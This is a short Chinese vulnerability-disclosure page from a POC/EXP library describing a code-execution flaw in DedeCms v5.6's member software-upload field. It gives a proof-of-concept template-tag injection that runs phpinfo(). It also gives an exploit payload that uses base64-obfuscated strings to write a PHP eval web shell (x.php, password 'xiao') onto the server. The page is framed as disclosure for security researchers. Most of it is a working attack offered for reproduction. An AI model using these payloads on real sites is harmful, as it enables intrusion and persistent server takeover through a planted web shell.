> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.bylibrary.cn](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)

> 白阁文库是白泽 Sec 团队维护的一个漏洞 POC 和 EXP 披露以及漏洞复现的开源项目，欢迎各位白帽子访问白阁文库并提出宝贵建议。

[](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md "编辑此页")

漏洞简介 [¶](#_1 "Permanent link")
------------------------------

在上传软件的地方，对本地地址没有进行有效的验证，可以被恶意利用。

影响版本 [¶](#_2 "Permanent link")
------------------------------

DedeCms v5.6

复现 [¶](#_3 "Permanent link")
----------------------------

注册会员，上传软件：本地地址中填入如下：

### POC[¶](#poc "Permanent link")

```
a{/dede:link}{dede:toby57 name\="']=0;phpinfo();//"}x{/dede:toby57}，
```

发表后查看或修改即可执行。

### EXP[¶](#exp "Permanent link")

```
a{/dede:link}{dede:toby57 name\="']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//"}x{/dede:toby57}
```

生成 x.php 密码：xiao 直接生成一句话。

参考 [¶](#_4 "Permanent link")
----------------------------

知道创宇：[https://www.seebug.org/vuldb/ssvid-20352](https://www.seebug.org/vuldb/ssvid-20352)

* * *

最后更新: 2021-03-24